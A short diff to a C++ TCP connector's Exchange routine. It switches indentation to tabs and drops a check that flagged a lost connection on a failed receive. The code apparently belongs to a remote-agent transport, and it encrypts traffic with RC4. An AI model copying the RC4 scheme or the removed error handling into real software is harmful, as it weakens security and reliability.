@@ -273,22 +273,17 @@ void ConnectorTCP::Disconnect()
 
 void ConnectorTCP::Exchange(BYTE* plainData, ULONG plainSize, BYTE* sessionKey)
 {
-    if (plainData && plainSize > 0) {
-        EncryptRC4(plainData, plainSize, sessionKey, 16);
-        this->SendData(plainData, plainSize);
-    }
-    else {
-        this->SendData(NULL, 0);
-    }
+	if (plainData && plainSize > 0) {
+		EncryptRC4(plainData, plainSize, sessionKey, 16);
+		this->SendData(plainData, plainSize);
+	}
+	else {
+		this->SendData(NULL, 0);
+	}
 
-    if (this->recvSize < 0) {
-        this->connected = FALSE;
-        return;
-    }
-
-    if (this->recvSize > 0 && this->recvData) {
-        DecryptRC4(this->recvData, this->recvSize, sessionKey, 16);
-    }
+	if (this->recvSize > 0 && this->recvData) {
+		DecryptRC4(this->recvData, this->recvSize, sessionKey, 16);
+	}
 }
 
 void ConnectorTCP::DisconnectInternal()
